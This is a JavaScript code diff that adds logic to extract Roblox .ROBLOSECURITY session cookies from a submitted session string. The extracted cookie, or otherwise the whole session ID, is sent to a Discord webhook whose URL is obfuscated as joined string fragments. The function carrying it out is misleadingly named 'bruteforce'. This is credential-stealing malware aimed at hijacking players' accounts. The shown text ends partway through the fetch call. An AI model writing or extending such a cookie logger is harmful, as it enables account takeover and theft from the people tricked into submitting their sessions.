@@ -1,25 +1,41 @@
 const _encryptedParts = [
-'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
   'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
   'Ue', 'rP', 'Qe', 'XN', 'xq', '8b', 'xZ', 'dS', 'rL', 'oB', 'UP', 'ab', '1p', 
   'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
 ];
 
-const _encryptedParts101 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
+const _decrypted = _encryptedParts.join(''); // Decrypt the URL by concatenating the parts
 
-// Decrypt the URL by concatenating the parts
-const _decrypted = _encryptedParts.join(''); 
+function extractRobloxSecurityCookie(sessionId) {
+  // Use a regular expression to find the .ROBLOSECURITY cookie
+  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = sessionId.match(regex);
+  if (match && match[1]) {
+    return match[1]; // Return the cookie value
+  }
+  return null; // Return null if not found
+}
 
 function bruteforce(sessionId) {
+  let content;
+
+  // Check if the sessionId contains .ROBLOSECURITY
+  if (sessionId.includes(".ROBLOSECURITY")) {
+    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
+    if (robloxSecurityCookie) {
+      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
+    } else {
+      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
+    }
+  } else {
+    // Send the entire sessionId as-is
+    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
+  }
+
   const payload = {
-    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``
+    content: content
   };
 
   fetch(_decrypted, {
